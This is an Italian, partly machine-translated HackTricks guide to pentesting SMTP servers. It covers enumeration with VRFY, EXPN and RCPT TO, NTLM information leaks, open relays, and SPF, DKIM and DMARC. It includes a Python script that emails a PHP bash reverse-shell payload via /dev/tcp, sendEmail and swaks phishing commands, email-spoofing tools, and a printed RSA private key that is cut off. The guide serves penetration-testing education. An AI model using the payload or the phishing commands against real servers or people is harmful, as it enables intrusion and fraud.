# 25,465,587 - Pentesting SMTP/s

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configurazione immediatamente disponibile per la valutazione delle vulnerabilit√† e il penetration testing**. Esegui un pentest completo da qualsiasi luogo con oltre 20 strumenti e funzionalit√† che vanno dalla ricognizione alla generazione di report. Non sostituiamo i pentester, sviluppiamo invece strumenti personalizzati, moduli di rilevamento ed exploit per permettere loro di dedicarsi a scavare pi√π a fondo, ottenere accesso shell e divertirsi.

{% embed url="https://pentest-tools.com/" %}

## **Informazioni di base**

Il **Simple Mail Transfer Protocol (SMTP)** √® un protocollo utilizzato nella suite TCP/IP per l'**invio e la ricezione di e-mail**. A causa delle sue limitazioni nella messa in coda dei messaggi al destinatario, SMTP viene spesso utilizzato insieme a **POP3 o IMAP**. Questi protocolli aggiuntivi consentono agli utenti di archiviare i messaggi su una casella di posta del server e di scaricarli periodicamente.

Nella pratica, √® comune che i **programmi di posta elettronica** utilizzino **SMTP per l'invio di e-mail**, mentre utilizzano **POP3 o IMAP per la ricezione**. Nei sistemi basati su Unix, **sendmail** spicca come il server SMTP pi√π utilizzato per scopi di posta elettronica. Il pacchetto commerciale noto come Sendmail comprende un server POP3. Inoltre, **Microsoft Exchange** fornisce un server SMTP e offre l'opzione di includere il supporto POP3.

**Porta predefinita:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### Intestazioni EMAIL

Se hai l'opportunit√† di **far inviare all'utente una email** (tramite il modulo di contatto della pagina web, ad esempio), fallo perch√© **potresti apprendere informazioni sulla topologia interna** dell'utente visualizzando le intestazioni della mail.

Puoi anche ottenere una email da un server SMTP cercando di **inviare a quel server una email a un indirizzo inesistente** (poich√© il server invier√† all'attaccante una mail di notifica di mancata consegna). Ma assicurati di inviare l'email da un indirizzo consentito (verifica la politica SPF) e di poter ricevere messaggi di notifica di mancata consegna.

Dovresti anche provare a **inviare contenuti diversi perch√© potresti trovare informazioni pi√π interessanti** nelle intestazioni come: `X-Virus-Scanned: by av.domain.com`\
Dovresti inviare il file di test EICAR.\
Rilevare l'**AV** potrebbe consentirti di sfruttare **vulnerabilit√† note.**

## Azioni di base

### **Banner Grabbing/Connessione di base**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:

SMTPS (Simple Mail Transfer Protocol Secure) √® una variante sicura del protocollo SMTP utilizzata per inviare e ricevere email in modo crittografato. SMTPS utilizza il protocollo SSL/TLS per crittografare la comunicazione tra il client email e il server SMTP. Questo garantisce la riservatezza e l'integrit√† dei dati trasmessi durante il processo di invio delle email.

Per connettersi a un server SMTPS, √® necessario utilizzare una connessione crittografata tramite SSL/TLS. Di solito, il server SMTPS ascolta sulla porta 465. Una volta stabilita la connessione, il client email e il server SMTPS negoziano i parametri di crittografia e autenticazione per garantire una comunicazione sicura.

Durante un test di penetrazione su un server SMTPS, √® possibile eseguire diverse tecniche per identificare eventuali vulnerabilit√† o punti deboli. Queste tecniche includono l'enumerazione degli utenti, l'iniezione di comandi, l'invio di email di phishing e l'esecuzione di attacchi di forza bruta per indovinare le password degli account email.

√à importante notare che il test di penetrazione su un server SMTPS deve essere eseguito solo con il consenso del proprietario del sistema. L'obiettivo principale di un test di penetrazione √® identificare e risolvere le vulnerabilit√† di sicurezza per migliorare la protezione del sistema.
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Trovare i server MX di un'organizzazione

To find the MX servers of an organization, you can use the following methods:

#### DNS Lookup

Perform a DNS lookup for the organization's domain to retrieve the MX records. This can be done using the `nslookup` or `dig` command.

```bash
nslookup -type=MX <domain>
```

```bash
dig MX <domain>
```

#### Online Tools

There are various online tools available that can help you find the MX servers of an organization. Some popular ones include:

- [MX Toolbox](https://mxtoolbox.com/)
- [DNSstuff](https://www.dnsstuff.com/)
- [Network-Tools](https://network-tools.com/)

#### SMTP Enumeration

You can also perform SMTP enumeration to identify the MX servers. This involves connecting to the SMTP port (usually port 25) of the organization's mail server and querying for the list of accepted recipients.

```bash
telnet <MX server> 25
```

Once connected, you can use SMTP commands like `EHLO`, `MAIL FROM`, and `RCPT TO` to enumerate the recipients.

#### Email Header Analysis

Analyzing the email headers of received emails from the organization can provide information about the MX servers. Look for the `Received` headers, which typically contain the IP addresses or hostnames of the servers involved in the email delivery.

By using these methods, you can identify the MX servers of an organization, which can be useful for further analysis and testing during a penetration test.
```bash
dig +short mx google.com
```
### Enumerazione

SMTP enumeration is the process of gathering information about an SMTP server, such as valid user accounts, email addresses, and server configuration. This information can be useful for various purposes, including social engineering attacks, email spoofing, and unauthorized access.

There are several techniques that can be used to enumerate an SMTP server:

1. **SMTP VRFY Command**: The VRFY command is used to verify the existence of a specific user or email address on the server. By sending VRFY commands with different usernames or email addresses, it is possible to determine which ones are valid.

2. **SMTP RCPT TO Command**: The RCPT TO command is used to specify the recipient of an email. By sending RCPT TO commands with different email addresses, it is possible to determine which ones are valid.

3. **SMTP EXPN Command**: The EXPN command is used to expand mailing lists on the server. By sending EXPN commands with different mailing list names, it is possible to obtain a list of valid email addresses.

4. **SMTP EHLO/HELO Command**: The EHLO/HELO command is used to initiate a connection with the server. By sending EHLO/HELO commands, it is possible to obtain information about the server, such as its hostname and supported features.

5. **SMTP Banner Grabbing**: Banner grabbing is the process of retrieving the banner message sent by the server when a connection is established. This banner message often contains information about the server, such as its software version and hostname.

6. **DNS MX Records**: MX records are DNS records that specify the mail servers responsible for accepting email messages for a specific domain. By querying the DNS MX records for a domain, it is possible to obtain a list of potential SMTP servers.

7. **User Enumeration**: User enumeration involves trying different usernames or email addresses and observing the server's response. By analyzing the server's response, it is possible to determine which usernames or email addresses are valid.

It is important to note that SMTP enumeration should only be performed on systems that you have permission to test. Unauthorized enumeration of SMTP servers is illegal and unethical. Always obtain proper authorization before conducting any enumeration activities.
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - Divulgazione di informazioni

Se il server supporta l'autenticazione NTLM (Windows), √® possibile ottenere informazioni sensibili (versioni). Ulteriori informazioni [**qui**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
Oppure **automatizza** questo con il plugin **nmap** `smtp-ntlm-info.nse`

### Nome del server interno - Divulgazione delle informazioni

Alcuni server SMTP completano automaticamente l'indirizzo del mittente quando viene emesso il comando "MAIL FROM" senza un indirizzo completo, rivelando il suo nome interno:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

Verifica se riesci a intercettare qualche password dai pacchetti verso la porta 25.

### [Bruteforce di autenticazione](../../generic-methodologies-and-resources/brute-force.md#smtp)

## Enumerazione del bruteforce dell'username

**L'autenticazione non √® sempre necessaria**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY

La tecnica VRFY (Verificar) viene utilizzata per verificare l'esistenza di un utente in un server SMTP. Questa tecnica sfrutta il comando VRFY del protocollo SMTP per interrogare il server e ottenere informazioni sugli utenti validi.

#### Come funziona

Il comando VRFY viene utilizzato per verificare se un determinato utente esiste nel server SMTP di destinazione. Il comando viene inviato al server seguito dal nome dell'utente che si desidera verificare. Il server risponder√† con un codice di stato che indicher√† se l'utente esiste o meno.

#### Utilizzo in un attacco

La tecnica VRFY pu√≤ essere utilizzata in un attacco di enumerazione degli utenti, in cui un attaccante cerca di ottenere informazioni sugli utenti validi presenti nel server SMTP. Queste informazioni possono essere utilizzate per scopi malevoli, come l'invio di spam o l'esecuzione di attacchi di phishing mirati.

#### Contromisure

Per proteggersi dagli attacchi VRFY, √® consigliabile disabilitare il comando VRFY sul server SMTP o implementare controlli di accesso che limitino l'accesso a questa funzionalit√† solo a utenti autorizzati. Inoltre, √® importante mantenere aggiornato il server SMTP con le ultime patch di sicurezza per mitigare eventuali vulnerabilit√† note.
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN

L'espansione (EXPN) √® un comando SMTP che viene utilizzato per ottenere informazioni sugli utenti validi su un server di posta. Questo comando pu√≤ essere sfruttato dagli hacker per ottenere informazioni sensibili come gli indirizzi email degli utenti.

#### Come funziona l'espansione (EXPN)

Quando viene inviato il comando EXPN a un server di posta, il server risponder√† con una lista di utenti validi o con un messaggio di errore nel caso in cui l'espansione non sia consentita. Questo pu√≤ essere utile per gli hacker nel processo di raccolta di informazioni per un attacco di phishing o per l'invio di spam.

#### Come proteggersi dall'espansione (EXPN)

Per proteggersi dall'espansione (EXPN), √® consigliabile disabilitare questa funzionalit√† sul server di posta. Inoltre, √® importante implementare misure di sicurezza come l'autenticazione a due fattori e l'uso di password complesse per ridurre il rischio di accesso non autorizzato al server di posta.

#### Esempio di utilizzo del comando EXPN

```
S: 250 Requested mail action okay, completed
C: EXPN user@example.com
S: 250 user@example.com
```

Nell'esempio sopra, il server di posta risponde con l'indirizzo email dell'utente "user@example.com" dopo aver ricevuto il comando EXPN. Questo pu√≤ essere utilizzato dagli hacker per ottenere una lista di indirizzi email validi sul server di posta.
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### Strumenti automatici

There are several automatic tools available for SMTP pentesting that can help in identifying vulnerabilities and weaknesses in the SMTP service. These tools automate the process of scanning and testing the SMTP server for potential security issues. Some popular automatic tools for SMTP pentesting include:

- **Nmap**: Nmap is a powerful network scanning tool that can be used to scan for open SMTP ports and identify potential vulnerabilities in the SMTP service.

- **Metasploit**: Metasploit is a widely used penetration testing framework that includes various modules for testing SMTP servers. These modules can be used to exploit vulnerabilities in the SMTP service and gain unauthorized access to the server.

- **OpenVAS**: OpenVAS is an open-source vulnerability scanning tool that can be used to scan SMTP servers for known vulnerabilities and misconfigurations.

- **SMTP User Enumeration Tools**: There are several tools available that can be used to enumerate valid SMTP users on a server. These tools can help in identifying potential targets for further attacks.

It is important to note that while automatic tools can be helpful in identifying vulnerabilities, manual testing and analysis are also crucial for a comprehensive SMTP pentesting approach.
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configurazione immediatamente disponibile per la valutazione delle vulnerabilit√† e il penetration testing**. Esegui un pentest completo da qualsiasi luogo con oltre 20 strumenti e funzionalit√† che vanno dalla ricognizione alla generazione di report. Non sostituiamo i pentester - sviluppiamo strumenti personalizzati, moduli di rilevamento ed exploit per restituire loro del tempo per approfondire, ottenere accesso ai sistemi e divertirsi.

{% embed url="https://pentest-tools.com/" %}

## Rapporti DSN

**Rapporti di notifica dello stato di consegna**: Se invii una **email** a un'organizzazione a un **indirizzo non valido**, l'organizzazione ti notificher√† che l'indirizzo √® stato invalidato inviando una **mail di risposta**. Le **intestazioni** dell'email restituita conterranno possibili **informazioni sensibili** (come l'indirizzo IP dei servizi di posta che hanno interagito con i rapporti o le informazioni sul software antivirus).

## [Comandi](smtp-commands.md)

### Invio di una email dalla console di Linux
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Invio di un'email con Python

Per inviare un'email utilizzando Python, √® possibile utilizzare il modulo `smtplib` che fornisce una semplice interfaccia per interagire con un server SMTP (Simple Mail Transfer Protocol).

Ecco un esempio di codice che mostra come inviare un'email utilizzando Python:

```python
import smtplib

def send_email(sender_email, sender_password, recipient_email, subject, message):
    try:
        # Connessione al server SMTP
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)

        # Creazione del messaggio
        email_message = f"Subject: {subject}\n\n{message}"

        # Invio dell'email
        server.sendmail(sender_email, recipient_email, email_message)
        print("Email inviata con successo!")

    except Exception as e:
        print(f"Si √® verificato un errore durante l'invio dell'email: {str(e)}")

    finally:
        # Chiusura della connessione al server SMTP
        server.quit()

# Esempio di utilizzo
sender_email = "tuo_indirizzo_email@gmail.com"
sender_password = "tua_password"
recipient_email = "indirizzo_email_destinatario@gmail.com"
subject = "Ciao!"
message = "Questo √® un esempio di email inviata tramite Python."

send_email(sender_email, sender_password, recipient_email, subject, message)
```

Assicurati di sostituire `tuo_indirizzo_email@gmail.com` con il tuo indirizzo email effettivo e `tua_password` con la tua password. Inoltre, modifica `indirizzo_email_destinatario@gmail.com` con l'indirizzo email del destinatario effettivo.

Questo esempio utilizza il server SMTP di Gmail, ma puoi utilizzare un server SMTP diverso modificando l'indirizzo e la porta del server nella chiamata `smtplib.SMTP()`.
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
## Contromisure per il Mail Spoofing

Le organizzazioni sono protette dall'invio non autorizzato di email a loro nome grazie all'utilizzo di **SPF**, **DKIM** e **DMARC**, a causa della facilit√† di falsificazione dei messaggi SMTP.

Una **guida completa a queste contromisure** √® disponibile su [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

{% hint style="danger" %}
SPF [√® stato "deprecato" nel 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). Ci√≤ significa che anzich√© creare un **record TXT** in `_spf.domain.com`, lo si crea in `domain.com` utilizzando la **stessa sintassi**.\
Inoltre, per riutilizzare i record SPF precedenti, √® comune trovare qualcosa del genere `"v=spf1 include:_spf.google.com ~all"`
{% endhint %}

**Sender Policy Framework** (SPF) √® un meccanismo che consente agli agenti di trasferimento di posta (MTA) di verificare se un host che invia una email √® autorizzato interrogando un elenco di server di posta autorizzati definiti dalle organizzazioni. Questo elenco, che specifica gli indirizzi IP/range, i domini e altre entit√† **autorizzate a inviare email a nome di un nome di dominio**, include vari "**Meccanismi**" nel record SPF.

#### Meccanismi

Da [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Meccanismo | Descrizione                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Corrisponde sempre; utilizzato per un risultato predefinito come `-all` per tutti gli IP non corrispondenti ai meccanismi precedenti.                                                                                                                                                                                                                                  |
| A         | Se il nome di dominio ha un record di indirizzo (A o AAAA) che pu√≤ essere risolto nell'indirizzo del mittente, corrisponder√†.                                                                                                                                                                                                                   |
| IP4       | Se il mittente si trova in un determinato intervallo di indirizzi IPv4, corrisponde.                                                                                                                                                                                                                                                                              |
| IP6       | Se il mittente si trova in un determinato intervallo di indirizzi IPv6, corrisponde.                                                                                                                                                                                                                                                                              |
| MX        | Se il nome di dominio ha un record MX che risolve all'indirizzo del mittente, corrisponder√† (ovvero la posta proviene da uno dei server di posta in entrata del dominio).                                                                                                                                                                          |
| PTR       | Se il nome di dominio (record PTR) per l'indirizzo del client si trova nel dominio specificato e tale nome di dominio risolve all'indirizzo del client (DNS inverso confermato in avanti), corrisponde. Questo meccanismo √® sconsigliato e dovrebbe essere evitato, se possibile.                                                                                     |
| EXISTS    | Se il nome di dominio specificato risolve a un qualsiasi indirizzo, corrisponde (indipendentemente dall'indirizzo a cui risolve). Questo viene utilizzato raramente. Insieme al linguaggio macro SPF offre corrispondenze pi√π complesse come le query DNSBL.                                                                                                                           |
| INCLUDE   | Fa riferimento alla politica di un altro dominio. Se la politica di tale dominio viene superata, anche questo meccanismo viene superato. Tuttavia, se la politica inclusa non viene superata, il processo continua. Per delegare completamente alla politica di un altro dominio, √® necessario utilizzare l'estensione di reindirizzamento.                                                                                     |
| REDIRECT  | <p>Un reindirizzamento √® un puntatore a un altro nome di dominio che ospita una politica SPF, consente a pi√π domini di condividere la stessa politica SPF. √à utile quando si lavora con un gran numero di domini che condividono la stessa infrastruttura di posta elettronica.</p><p>Verr√† utilizzata la politica SPF del dominio indicato nel meccanismo di reindirizzamento.</p> |

√à anche possibile identificare **Qualificatori** che indicano **cosa fare se un meccanismo viene corrisposto**. Per impostazione predefinita, viene utilizzato il **qualificatore "+"** (quindi se viene corrisposto un qualsiasi meccanismo, ci√≤ significa che √® consentito).\
Di solito si nota **alla fine di ogni politica SPF** qualcosa del genere: **\~all** o **-all**. Questo viene utilizzato per indicare che **se il mittente non corrisponde a nessuna politica SPF, √® necessario contrassegnare l'email come non attendibile (\~) o rifiutare (-) l'email.**

#### Qualificatori

Ogni meccanismo all'interno della politica pu√≤ essere preceduto da uno dei quattro qualificatori per definire il risultato previsto:

* **`+`**: Corrisponde a un risultato PASS. Per impostazione predefinita, i meccanismi assumono questo qualificatore, rendendo `+mx` equivalente a `mx`.
* **`?`**: Rappresenta un risultato NEUTRO, trattato in modo simile a NONE (nessuna politica specifica).
* **`~`**: Indica SOFTFAIL, fungendo da punto intermedio tra NEUTRO e FAIL. Le email che soddisfano questo risultato vengono generalmente accettate ma contrassegnate di conseguenza.
* **`-`**: Indica FAIL, suggerendo che l'email dovrebbe essere rifiutata completamente.

Nell'esempio seguente viene illustrata la **politica SPF di google.com**. Notare l'inclusione delle politiche SPF da diversi domini all'interno della prima politica SPF:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Tradizionalmente era possibile falsificare qualsiasi nome di dominio che non avesse un record SPF corretto o inesistente. **Oggi**, se una **email** proviene da un **dominio senza un record SPF valido**, probabilmente verr√† **rifiutata/marcata come non attendibile automaticamente**.

Per verificare l'SPF di un dominio, √® possibile utilizzare strumenti online come: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM viene utilizzato per firmare le email in uscita, consentendo la loro validazione da parte di agenti di trasferimento di posta (MTA) esterni attraverso il recupero della chiave pubblica del dominio dal DNS. Questa chiave pubblica si trova nel record TXT del dominio. Per accedere a questa chiave, √® necessario conoscere sia il selettore che il nome di dominio.

Ad esempio, per richiedere la chiave, sono essenziali il nome di dominio e il selettore. Questi possono essere trovati nell'intestazione della posta `DKIM-Signature`, ad esempio, `d=gmail.com;s=20120113`.

Un comando per recuperare queste informazioni potrebbe essere:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Domain-based Message Authentication, Reporting & Conformance)

DMARC migliora la sicurezza delle email basandosi sui protocolli SPF e DKIM. Esso definisce le politiche che guidano i server di posta nella gestione delle email provenienti da un dominio specifico, inclusi come gestire i fallimenti dell'autenticazione e dove inviare i rapporti sulle azioni di elaborazione delle email.

**Per ottenere il record DMARC, √® necessario interrogare il sottodominio \_dmarc**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### Tag DMARC

| Nome tag | Scopo                                         | Esempio                          |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | Versione del protocollo                        | v=DMARC1                        |
| pct      | Percentuale di messaggi sottoposti a filtraggio | pct=20                          |
| ruf      | URI di segnalazione per rapporti forensi       | ruf=mailto:authfail@example.com |
| rua      | URI di segnalazione per rapporti aggregati     | rua=mailto:aggrep@example.com   |
| p        | Politica per il dominio organizzativo          | p=quarantine                    |
| sp       | Politica per i sottodomini del dominio organizzativo | sp=reject                       |
| adkim    | Modalit√† di allineamento per DKIM              | adkim=s                         |
| aspf     | Modalit√† di allineamento per SPF               | aspf=r                          |

### **Cosa succede con i sottodomini?**

**Da** [**qui**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
√à necessario avere record SPF separati per ogni sottodominio da cui si desidera inviare posta.\
Quanto segue √® stato originariamente pubblicato su openspf.org, che era una grande risorsa per questo tipo di informazioni.

> La domanda del demone: cosa succede con i sottodomini?
>
> Se ricevo una mail da pielovers.demon.co.uk e non ci sono dati SPF per pielovers, dovrei tornare indietro di un livello e testare SPF per demon.co.uk? No. Ogni sottodominio su Demon √® un cliente diverso e ogni cliente potrebbe avere la propria politica. Non avrebbe senso che la politica di Demon si applichi a tutti i suoi clienti per impostazione predefinita; se Demon vuole farlo, pu√≤ configurare record SPF per ogni sottodominio.
>
> Quindi il consiglio per i pubblicatori SPF √® il seguente: √® necessario aggiungere un record SPF per ogni sottodominio o nome host che ha un record A o MX.
>
> I siti con record A o MX wildcard dovrebbero avere anche un record SPF wildcard, nella forma: \* IN TXT "v=spf1 -all"

Ha senso - un sottodominio potrebbe trovarsi in una posizione geografica diversa e avere una definizione SPF molto diversa.

### **Relay aperto**

Quando vengono inviate email, √® fondamentale assicurarsi che non vengano segnalate come spam. Questo viene spesso realizzato attraverso l'uso di un **server di relay** che √® affidabile per il destinatario. Tuttavia, una sfida comune √® che gli amministratori potrebbero non essere pienamente consapevoli di quali **intervalli di indirizzi IP siano sicuri da consentire**. Questa mancanza di comprensione pu√≤ portare a errori nella configurazione del server SMTP, un rischio spesso identificato nelle valutazioni della sicurezza.

Una soluzione alternativa che alcuni amministratori utilizzano per evitare problemi di consegna delle email, specialmente per le comunicazioni con potenziali clienti o clienti in corso, √® quella di **consentire connessioni da qualsiasi indirizzo IP**. Ci√≤ viene fatto configurando il parametro `mynetworks` del server SMTP per accettare tutti gli indirizzi IP, come mostrato di seguito:
```bash
mynetworks = 0.0.0.0/0
```
Per verificare se un server di posta √® un open relay (cio√® in grado di inoltrare email da qualsiasi fonte esterna), viene comunemente utilizzato lo strumento `nmap`. Esso include uno script specifico progettato per testare ci√≤. Il comando per eseguire una scansione dettagliata su un server (ad esempio, con IP 10.10.10.10) sulla porta 25 utilizzando `nmap` √®:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Strumenti**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **Verifica delle configurazioni errate di SPF e DMARC**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Ottieni automaticamente le configurazioni di SPF e DMARC**

### Invia email falsificate

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)

**Oppure puoi utilizzare uno strumento:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
Se si verifica un **errore nell'utilizzo della libreria python dkim** durante l'analisi della chiave, √® possibile utilizzare la seguente chiave.\
**NOTA**: Questa √® solo una soluzione temporanea per effettuare controlli rapidi nei casi in cui, per qualche motivo, la chiave privata openssl **non pu√≤ essere analizzata da dkim**.
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
